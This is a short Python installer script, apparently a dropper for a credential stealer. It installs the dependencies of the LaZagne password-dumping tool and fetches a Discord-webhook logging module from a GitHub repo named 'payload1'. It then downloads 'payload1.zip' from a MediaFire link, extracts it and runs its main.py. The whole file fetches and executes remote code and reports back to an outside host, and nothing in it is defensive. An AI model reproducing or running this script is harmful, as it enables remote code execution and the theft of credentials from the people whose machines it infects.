from time import sleep
import os
import urllib

#download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip" # link the mirror (this is old version)
download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip" # link the mirror  (this is current version)

def Download(link, filename):
    os.system("curl.exe " + link + ' --output ' + filename)

Download("https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/requirements.txt", "requirements.txt")
os.system("pip install -r requirements.txt")
os.system("pip install -r requirements.txt") # Install requierments
os.system("pip install discord_webhook")
Download("https://raw.githubusercontent.com/k1llerfr0g22/payload1/main/logging_bot.py", "logging_bot.py")
from logging_bot import log
log("requirements installed, installer started")
log("download payload")
Download(download_link, "payload1.zip")
os.system("tar -xf payload1.zip") # extract payload
os.system("del payload1.zip") 
os.system("cd payload1") 
os.system("python3 main.py") 